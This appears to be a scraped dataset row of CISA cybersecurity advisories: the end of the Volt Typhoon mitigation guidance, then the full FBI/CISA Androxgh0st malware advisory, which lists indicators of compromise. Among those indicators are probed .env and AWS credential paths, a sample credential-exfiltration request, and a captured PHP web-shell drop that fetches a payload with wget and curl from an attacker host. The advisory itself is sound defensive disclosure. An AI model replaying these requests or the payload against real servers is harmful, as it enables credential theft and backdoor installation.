Improve management of hybrid (cloud and on-premises) identity federation by:

Using cloud only administrators that are asynchronous with on-premises environments and ensuring on-premises administrators are asynchronous to the cloud.
Using CISA’s SCuBAGear tool to discover cloud misconfigurations in Microsoft cloud tenants. SCuBA gear is automation script for comparing Federal Civilian Executive Branch (FCEB) agency tenant configurations against CISA M365 baseline recommendations. SCuBAGear is part of CISA’s Secure Cloud Business Applications (SCuBA) project, which provides guidance for FCEB agencies, securing their cloud business application environments and protecting federal information created, accessed, shared, and stored in those environments. Although tailored to FCEB agencies, the project provides security guidance applicable to all organizations with cloud environments. For more information on SCuBAGear see CISA’s Secure Cloud Business Applications (SCuBA) Project.
Using endpoint detection and response capabilities to actively defend on-premises federation servers.



Secure Remote Access Services

Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best practices, including auditing the network for systems using RDP, closing unused RDP ports, and logging RDP login attempts.
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 (SMBv3) after mitigating existing dependencies (on existing systems or applications), as they may break when disabled.
Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see page 8 of the guide).
Apply mitigations from the joint Guide to Securing Remote Access Software.

Secure Sensitive Data

Securely store sensitive data (including operational technology documentation, network diagrams, etc.), ensuring that only authenticated and authorized users can access the data.

Implement Network Segmentation

Ensure that sensitive accounts use their administrator credentials only on hardened, secure computers. This practice can reduce lateral movement exposure within networks.
Conduct comprehensive trust assessments to identify business-critical trusts and apply necessary controls to prevent unauthorized cross-forest/domain traversal.
Harden federated authentication by enabling Secure Identifier (SID) Filtering and Selective Authentication on AD trust relationships to further restrict unauthorized access across domain boundaries.
Implement network segmentation to isolate federation servers from other systems and limit allowed traffic to systems and protocols that require access in accordance with Zero Trust principles.

Secure Cloud Assets

Harden cloud assets in accordance with vendor-provided or industry standard hardening guidance.

Organizations with Microsoft cloud infrastructure, see CISA’s Microsoft 365 Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Microsoft Defender for Office 365, Azure Active Directory (now known as Microsoft Entra ID), Exchange Online, OneDrive for Business, Power BI, Power Platform, SharePoint Online, and Teams. For additional guidance, see the Australian Signals Directorate’s Blueprint for Secure Cloud.
Organizations with Google cloud infrastructure, see CISA’s Google Workspace Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Groups for Business, GMAIL, Google Calendar, Google Chat, Google Common Controls, Google Classroom, Google Drive and Docs, Google Meet, and Google Sites.


Revoke unnecessary public access to cloud environment. This involves reviewing and restricting public endpoints and ensuring that services like storage accounts, databases, and virtual machines are not publicly accessible unless absolutely necessary. Disable legacy authentication protocols across all cloud services and platforms. Legacy protocols frequently lack support for advanced security mechanisms such as multifactor authentication, rendering them susceptible to compromises. Instead, enforce the use of modern authentication protocols that support stronger security features like MFA, token-based authentication, and adaptive authentication measures.

Enforce this practice through the use of Conditional Access Policies. These policies can initially be run in report-only mode to identify potential impacts and plan mitigations before fully enforcing them. This approach allows organizations to systematically control access to their cloud resources, significantly reducing the risk of unauthorized access and potential compromise.


Regularly monitor and audit privileged cloud-based accounts, including service accounts, which are frequently abused to enable broad cloud resource access and persistence.

Be Prepared

Ensure logging is turned on for application, access, and security logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and VPNs),CPG 2T,. Given Volt Typhoon’s use of LOTL techniques and their significant dwell time, application event logs may be a valuable resource to hunt for Volt Typhoon activity because these logs typically remain on endpoints for relatively long periods of time.

For OT assets where logs are non-standard or not available, collect network traffic and communications between those assets and other assets.
Implement file integrity monitoring (FIM) tools to detect unauthorized changes.


Store logs in a central system, such as a security information and event management (SIEM) tool or central database.

Ensure the logs can only be accessed or modified by authorized and authenticated users,CPG 2U,.
Store logs for a period informed by risk or pertinent regulatory guidelines.
Tune log alerting to reduce noise while ensuring there are alerts for high-risk activities. (For information on alert tuning, see joint guide Identifying and Mitigating Living Off the Land Techniques.)


Establish and continuously maintain a baseline of installed tools and software, account behavior, and network traffic. This way, network defenders can identify potential outliers, which may indicate malicious activity. Note: For information on establishing a baseline, see joint guide Identifying and Mitigating Living off the Land Techniques.
Document a list of threats and cyber actor TTPs relevant to your organization (e.g., based on industry or sectors), and maintain the ability (such as via rules, alerting, or commercial prevention and detection systems) to detect instances of those key threats,CPG 3A,.
Implement periodic training for all employees and contractors that covers basic security concepts (such as phishing, business email compromise, basic operational security, password security, etc.), as well as fostering an internal culture of security and cyber awareness,CPG 2I,.

Tailor the training to network IT personnel/administrators and other key staff based on relevant organizational cyber threats and TTPs, such as Volt Typhoon. For example, communicate that Volt Typhoon actors are known to target personal email accounts of IT staff, and encourage staff to protect their personal email accounts by using strong passwords and implementing MFA.
In addition to basic cybersecurity training, ensure personnel who maintain or secure OT as part of their regular duties receive OT-specific cybersecurity training on at least an annual basis,CPG 2J,.
Educate users about the risks associated with storing unprotected passwords.



OT Administrators and Defenders

Change default passwords,CPG 2A, and ensure they meet the policy requirements for complexity. If the asset’s password cannot be changed, implement compensating controls for the device; for example, segment the device into separate enclaves and implement increased monitoring and logging.
Require that passwords for all OT password-protected assets be at least 15 characters, when technically feasible. In instances where minimum passwords lengths are not technically feasible (for example, assets in remote locations), apply compensating controls, record the controls, and log all login attempts.,CPG 2B,.
Enforce strict access policies for accessing OT networks. Develop strict operating procedures for OT operators that details secure configuration and usage.
Segment OT assets from IT environments by,CPG 2F,:

Denying all connections to the OT network by default unless explicitly allowed (e.g., by IP address and port) for specific system functionality.
Requiring necessary communications paths between IT and OT networks to pass through an intermediary, such as a properly configured firewall, bastion host, “jump box,” or a demilitarized zone (DMZ), which is closely monitored, captures network logs, and only allows connections from approved assets.


Closely monitor all connections into OT networks for misuse, anomalous activity, or OT protocols.
Monitor for unauthorized controller change attempts. Implement integrity checks of controller process logic against a known good baseline. Ensure process controllers are prevented from remaining in remote program mode while in operation if possible.
Lock or limit set points in control processes to reduce the consequences of unauthorized controller access.
Be prepared by:

Determining your critical operational processes’ reliance on key IT infrastructure:

Maintain and regularly update an inventory of all organizational OT assets.
Understand and evaluate cyber risk on “as-operated” OT assets.
Create an accurate “as-operated” OT network map and identify OT and IT network inter-dependencies.


Identifying a resilience plan that addresses how to operate if you lose access to or control of the IT and/or OT environment.

Plan for how to continue operations if a control system is malfunctioning, inoperative, or actively acting contrary to the safe and reliable operation of the process.
Develop workarounds or manual controls to ensure ICS networks can be isolated if the connection to a compromised IT environment creates risk to the safe and reliable operation of OT processes.


Create and regularly exercise an incident response plan.

Regularly test manual controls so that critical functions can be kept running if OT networks need to be taken offline.


Implement regular data backup procedures on OT networks.

Regularly test backup procedures.




Follow risk-informed guidance in the joint advisory NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, the NSA advisory Stop Malicious Cyber Activity Against Connected Operational Technology.

CONTACT INFORMATION
US organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact:

CISA’s 24/7 Operations Center at Report@cisa.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Water and Wastewater Systems Sector organizations, contact the EPA Water Infrastructure and Cyber Resilience Division at watercyberta@epa.gov to voluntarily provide situational awareness.
Entities required to report incidents to DOE should follow established reporting requirements, as appropriate. For other energy sector inquiries, contact EnergySRMA@hq.doe.gov.
For transportation entities regulated by TSA, report to CISA Central in accordance with the requirements found in applicable Security Directives, Security Programs, or TSA Order.

Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 5 through Table 17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES,1, fofa,2, Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques,3, GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet,4, GitHub - sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies,5, The Zeek Network Security Monitor
RESOURCES
Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniquesSecureworks: Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government and Defense Organizations
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
ACKNOWLEDGEMENTS
Fortinet and Microsoft contributed to this advisory.
VERSION HISTORY
February 7, 2024: Initial Version.March 7, 2024: Updated Mitigations section to add recommendation on “end of life” technology.
APPENDIX A: VOLT TYPHOON OBSERVED COMMANDS / LOTL ACTIVITY
See Table 2 and Table 3 for Volt Typhoon commands and PowerShell scripts observed by the U.S. authoring agencies during incident response activities. For additional commands used by Volt Typhoon, see joint advisory People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.


APPENDIX B: INDICATORS OF COMPROMISE
See Table 4 for Volt Typhoon IOCs obtained by the U.S. authoring agencies during incident response activities.
Note: See MAR-10448362-1.v1 for more information on this malware.

APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 17 for all referenced threat actor tactics and techniques in this advisory.



















This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a
4,"






Actions to take today to mitigate malicious cyber activity:




Prioritize patching known exploited vulnerabilities in internet-facing systems.
Review and ensure only necessary servers and services are exposed to the internet.
Review platforms or services that have credentials listed in .env files for unauthorized access or use.







SUMMARY
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with threat actors deploying Androxgh0st malware. Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.
Download the PDF version of this report:


AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware
(PDF,       576.40 KB
  )




AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware - Spanish
(PDF,       353.45 KB
  )


For a downloadable copy of IOCs, see:


AA24-016A STIX XML
(XML,       45.81 KB
  )




AA24-016A STIX JSON
(JSON,       39.87 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification and exploitation in target networks. According to open source reporting[1], Androxgh0st is a Python-scripted malware [T1059.006] primarily used to target .env files that contain confidential information, such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003].
Targeting the PHPUnit
Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit [T1190]. Websites using the PHPUnit module that have internet-accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code.
Malicious actors likely use Androxgh0st to download malicious files [T1105] to the system hosting the website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to provide backdoor access to the website. This allows threat actors to download additional malicious files for their operations and access databases.
Laravel Framework Targeting
Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework. After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level .env file is exposed and contains credentials for accessing additional services. Note: .env files commonly store credentials and tokens. Threat actors often target .env files to steal these credentials within the environment variables.
If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x[] containing certain data sent to the web server. This data is frequently used as an identifier for the threat actor. This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet). A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts.
Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the website. If the threat actors successfully identify the Laravel application key, they will attempt exploitation by using the key to encrypt PHP code [T1027.010]. The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and included in a future GET request to the website. The vulnerability defined in CVE-2018-15133 indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which can allow for remote code execution. In doing so, the threat actors can upload files to the website via remote access.
Apache Web Server Targeting
In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable web servers [T1595.002] running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can identify uniform resource locators (URLs) for files outside root directory through a path traversal attack [T1083]. If these files are not protected by the “request all denied” configuration and Common Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.
If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies [T1136]. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for conducting additional scanning activity [T1583.006].
INDICATORS OF COMPROMISE (IOCs)
Based on investigations and analysis, the following requests are associated with Androxgh0st activity:

Incoming GET and POST requests to the following URIs:

/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/.env


Incoming POST requests with the following strings:

[0x%5B%5D=androxgh0st]
ImmutableMultiDict([('0x[]', 'androxgh0st')])



In both previously listed POST request strings, the name androxgh0st has been observed to be replaced with other monikers.
Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include:

/info
/phpinfo
/phpinfo.php
/?phpinfo=1
/frontend_dev.php/$
/_profiler/phpinfo
/debug/default/view?panel=config
/config.json
/.json
/.git/config
/live_env
/.env.dist
/.env.save
/environments/.env.production
/.env.production.local
/.env.project
/.env.development
/.env.production
/.env.prod
/.env.development.local
/.env.old
/<insert-directory>/.env 

Note: the actor may attempt multiple different potential URI endpoints scanning for the .env file, for example /docker/.env or /local/.env.


/.aws/credentials
/aws/credentials
/.aws/config
/.git
/.test
/admin
/backend
/app
/current
/demo
/api
/backup
/beta
/cron
/develop
/Laravel
/laravel/core
/gists/cache
/test.php
/info.php
//.env
/admin-app/.env%20
/laravel/.env%20
/shared/.env%20
/.env.project%20
/apps/.env%20
/development/.env%20
/live_env%20
/.env.development%20

Targeted URIs for web-shell drop:

/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/Util/PHP/eval-stdin.php
//lib/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/Util/PHP/eval-stdin.php
//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/Util/PHP/eval-stdin.php
//phpunit/src/Util/PHP/eval-stdin.php
//phpunit/Util/PHP/eval-stdin.php
//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstdin.php
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
//vendor/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/Util/PHP/eval-stdin.php
//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval
stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/evalstdin.php
/phpunit/src/Util/PHP/eval-stdin.php
./phpunit/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php%20
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

An example of attempted credential exfiltration through (honeypot) open proxies:
POST /.aws/credentials HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept-encoding: gzip, deflateaccept: */*connection: keep-alivecontent-length: 20content-type: application/x-www-form-urlencoded0x%5B%5D=androxgh0st
An example of attempted web-shell drop through (honeypot) open proxies:
GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76accept-encoding: gzip, deflateaccept: */*connection: keep-alivex-forwarded-for: 200.172.238.135content-length: 279<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?>
Monikers used instead of Androxgh0st (0x%5B%5D=???):

Ridho
Aws
0x_0x
x_X
nopebee7
SMTPEX
evileyes0
privangga
drcrypter
errorcool
drosteam
androxmen
crack3rz
b4bbyghost
0x0day
janc0xsec
blackb0x
0x1331day
Graber

Example malware drops through eval-stdin.php:
hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4hxxps://chainventures.co[.]uk/.well-known/aasdcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6hxxp://download.asyncfox[.]xyz/download/xmrig.x86_6423fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066hxxps://pastebin[.]com/raw/zw0gAmpCca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317efhxxp://45.95.147[.]236/tmp.x86_646b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbchxxp://main.dsn[.]ovh/dns/pwerbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7hxxp://tangible-drink.surge[.]sh/configx.txtde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.

Table 1: Reconnaissance


Technique Title
ID
Use




Active Scanning: Vulnerability Scanning
T1595.002
The threat actor scans websites for specific vulnerabilities to exploit.




Table 2: Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Botnet
T1583.005
The threat actor establishes a botnet to identify and exploit victims.


Acquire Infrastructure: Web Services
T1583.006
The threat actor creates new AWS instances to use for scanning.




Table 3: Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
The threat actor exploits CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on websites via PHPUnit.




Table 4: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: Python
T1059.006
The threat actor uses Androxgh0st, a Python-scripted malware, to target victim files.




Table 5: Persistence


Technique Title
ID
Use




Valid Accounts
T1078
The threat actor abuses the simple mail transfer protocol (SMTP) by exploiting exposed credentials.


Server Software Component: Web Shell
T1505.003
The threat actor deploys web shells to maintain persistent access to systems.


Create Account
T1136
The threat actor attempts to create new users and user policies with compromised AWS credentials from a vulnerable website.




Table 6: Defense Evasion


Technique Title
ID
Use




Obfuscated Files or Information: Command Obfuscation
T1027.010
The threat actor can exploit a successfully identified Laravel application key to encrypt PHP code, which is then passed to the site as a value in the XSRF-TOKEN cookie.




Table 7: Credential Access


Technique Title
ID
Use




Credential Access
TA0006
The threat actor can access the application key of the Laravel application on the site.


Unsecured Credentials: Credentials in Files
T1552.001
The threat actor targets .env files that contain confidential credential information.




Table 8: Discovery


Technique Title
ID
Use




File and Directory Discovery
T1083
The threat actor can identify URLs for files outside root directory through a path traversal attack.


Network Service Discovery
T1046
The threat actor uses Androxgh0st to abuse simple mail transfer protocol (SMTP) via scanning.




Table 9: Collection


Technique Title
ID
Use




Email Collection
T1114
The threat actor interacts with application programming interfaces (APIs) to gather information.




Table 10: Command and Control


Technique Title
ID
Use




Ingress Tool Transfer
T1105
The threat actor runs PHP code through a POST request to download malicious files to the system hosting the website.



MITIGATIONS
The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture. For more information on secure by design, see CISA’s Secure by Design webpage.
The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by actors using Androxgh0st malware.

Keep all operating systems, software, and firmware up to date. Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Verify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible.
Ensure that any live Laravel applications are not in “debug” or testing mode. Remove all cloud credentials from .env files and revoke them. All cloud providers have safer ways to provide temporary, frequently rotated credentials to code running inside a web server without storing them in any file.
On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use.
Scan the server’s file system for unrecognized PHP files, particularly in the root directory or /vendor/phpunit/phpunit/src/Util/PHP folder.
Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-10).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI encourages organizations to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation.
When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
RESOURCES

CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
NIST: CVE-2017-9841
NIST: CVE-2018-15133
NIST: CVE-2021-41773
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design

REFERENCES

Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild

ACKNOWLEDGEMENTS
Amazon contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
VERSION HISTORY
January 16, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'T1595.002', 'T1190', 'T1083', 'T1583.006', 'T1114', 'T1552.001', 'T1027.010', 'T1105', 'T1046', 'T1595', 'T1505.003', 'T1136', 'T1583.005', 'T1059.006', 'T1078'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize patching known exploited vulnerabilities in internet-facing systems.
Review and ensure only necessary servers and services are exposed to the internet.
Review platforms or services that have credentials listed in .env files for unauthorized access or use.







SUMMARY
